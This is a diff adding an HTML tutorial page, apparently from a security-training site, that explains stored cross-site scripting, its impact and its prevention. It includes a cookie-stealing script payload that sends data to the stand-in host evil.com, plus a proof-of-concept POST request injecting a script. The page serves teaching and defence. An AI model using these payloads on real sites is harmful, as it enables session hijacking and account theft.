@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Stored XSS - Cybersecurity Academy</title>
+  <link rel="stylesheet" href="style.css"/>
+  <script src="scripts.js" defer></script>
+</head>
+<body class="dark-theme">
+
+  <header class="site-header">
+    <h1>💥 Stored XSS (Cross-Site Scripting)</h1>
+    <p class="subtitle">Learn how attackers inject persistent scripts to compromise users and systems</p>
+  </header>
+
+  <main class="content">
+
+    <section class="intro">
+      <h2>🧠 What is Stored XSS?</h2>
+      <p>
+        Stored Cross-Site Scripting (also known as persistent XSS) is a type of web vulnerability where malicious scripts are injected into a target application and persistently stored on the server (e.g., in a database, logs, or message boards). When other users load that data, the script executes in their browser, potentially leading to session hijacking, phishing, or full account compromise.
+      </p>
+    </section>
+
+    <section class="concepts">
+      <h2>📚 Key Concepts</h2>
+      <ul>
+        <li><strong>Persistence:</strong> The payload is stored server-side and affects multiple users over time.</li>
+        <li><strong>Trigger:</strong> Triggered when a user views or loads the vulnerable content (e.g., viewing a comment, post, or profile).</li>
+        <li><strong>Impact:</strong> Can lead to account takeover, data theft, CSRF chaining, or malware delivery.</li>
+        <li><strong>Targets:</strong> Comment systems, forums, product reviews, user profiles, support tickets, etc.</li>
+      </ul>
+    </section>
+
+    <section class="how-it-works">
+      <h2>🔬 How Stored XSS Works</h2>
+      <ol>
+        <li>The attacker submits a crafted payload in a vulnerable input (e.g., a blog comment).</li>
+        <li>The server stores the data without proper sanitization.</li>
+        <li>When other users access the page, the browser executes the malicious script as part of the page content.</li>
+      </ol>
+    </section>
+
+    <section class="example">
+      <h2>🌐 Real-World Example</h2>
+      <p>Imagine a blog platform where users can comment on articles. An attacker submits the following payload:</p>
+      <pre><code>&lt;script&gt;fetch('https://evil.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code></pre>
+      <p>This payload gets stored in the database. When an admin views the comments, their browser runs the script, and their session cookie is exfiltrated to the attacker.</p>
+    </section>
+
+    <section class="poc">
+      <h2>🔧 Proof of Concept (PoC)</h2>
+      <p>1. Submit a POST request with malicious input:</p>
+      <pre><code>POST /comment HTTP/1.1
+Host: vulnerable-app.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+
+username=haxor&amp;comment=&lt;script&gt;alert('Stored XSS PoC')&lt;/script&gt;</code></pre>
+
+      <p>2. Server stores this comment and renders it without escaping:</p>
+      <pre><code>&lt;div class="comment"&gt;
+  &lt;strong&gt;haxor&lt;/strong&gt;:
+  &lt;script&gt;alert('Stored XSS PoC')&lt;/script&gt;
+&lt;/div&gt;</code></pre>
+
+      <p>3. Any user visiting this page sees an alert — or worse, suffers an attack.</p>
+    </section>
+
+    <section class="impact">
+      <h2>🔥 Impact of Stored XSS</h2>
+      <ul>
+        <li>Session hijacking using cookies</li>
+        <li>Account impersonation</li>
+        <li>Phishing attacks via DOM manipulation</li>
+        <li>Keylogging and credential theft</li>
+        <li>Full control over client-side behavior</li>
+      </ul>
+    </section>
+
+    <section class="defense">
+      <h2>🛡️ Prevention & Mitigation</h2>
+      <ul>
+        <li><strong>Input validation:</strong> Reject or sanitize input on server side using allowlists.</li>
+        <li><strong>Output encoding:</strong> Use context-aware encoding libraries (e.g., HTML escape).</li>
+        <li><strong>Content Security Policy (CSP):</strong> Restrict where scripts can load or execute from.</li>
+        <li><strong>Use modern frameworks:</strong> Frameworks like React/Vue escape output by default.</li>
+        <li><strong>Sanitization libraries:</strong> Use DOMPurify or similar for rich text inputs.</li>
+      </ul>
+    </section>
+
+    <section class="tips">
+      <h2>💡 Pro Tips</h2>
+      <ul>
+        <li>Test inputs on all fields that get stored and later displayed</li>
+        <li>Check both web and mobile apps for shared API vulnerabilities</li>
+        <li>Use developer tools (e.g., Burp Suite, browser DevTools) to view raw HTML output</li>
+        <li>Chain XSS with CSRF or privilege escalation for critical impact</li>
+      </ul>
+    </section>
+
+    <section class="tools">
+      <h2>🧰 Useful Tools</h2>
+      <ul>
+        <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a></li>
+        <li><a href="https://xss-game.appspot.com/" target="_blank">XSS Game by Google</a></li>
+        <li><a href="https://github.com/cure53/DOMPurify" target="_blank">DOMPurify</a></li>
+        <li><a href="https://owasp.org/www-community/xss/" target="_blank">OWASP XSS Guide</a></li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <p>BugDrillX © 2025 – Learn. Hack. Evolve. powered by <a href="https://pk.linkedin.com/company/scoltech" target="_blank">SCOLTECH</a></p>
+  </footer>
+
+</body>
+</html>
+    
